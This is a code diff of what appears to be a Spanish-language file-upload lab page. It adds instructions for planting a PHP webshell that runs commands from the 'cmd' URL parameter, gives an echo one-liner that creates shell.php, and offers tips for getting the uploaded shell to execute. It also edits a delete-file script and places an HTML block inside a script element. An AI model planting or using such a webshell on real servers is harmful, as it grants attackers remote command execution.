@@ -81,7 +81,9 @@
         <li><b>Ejemplo de payload PHP (webshell):</b></li>
       </ol>
       <pre>&lt;?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?&gt;
-  # Guarda como shell.php y sube el archivo</pre>
+    # Guarda como shell.php y sube el archivo
+    # Accede a /uploads/shell.php?cmd=id para probar
+    # Si ves un error de constante indefinida, revisa que el archivo empiece con <b>&lt;?php</b> y no texto plano.</pre>
       <ol start="4">
         <li>Sube el archivo mediante el formulario o con curl:</li>
       </ol>
@@ -137,7 +139,6 @@ function updateLabel(input) {
   }
 }
 window.deleteFile = function(event, filename) {
-  console.log('Intentando eliminar:', filename); // debug
   if (event) event.preventDefault();
   if (!confirm('¿Seguro que deseas eliminar el archivo ' + filename + '?')) return false;
   fetch('/uploads/delete/' + encodeURIComponent(filename), {
@@ -157,4 +158,17 @@ window.deleteFile = function(event, filename) {
   });
   return false;
 }
+if (!window.deleteFile) {
+  window.deleteFile = function(event, filename) {
+    alert('No se pudo inicializar la función de borrado. Recarga la página.');
+    return false;
+  }
+}
+<div class="alert-danger mb-4 text-xs font-mono">
+  <b>¿Ves el error "Undefined constant 'cmd'" al subir una webshell PHP?</b><br>
+  Asegúrate de que el archivo <b>NO</b> tenga espacios, saltos de línea ni BOM antes de <b>&lt;?php</b>.<br>
+  Sube el archivo desde Linux/macOS con:<br>
+  <code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</code><br>
+  Verifica que el primer byte del archivo sea <b>&lt;</b> y que la codificación sea UTF-8 sin BOM.
+</div>
 </script>
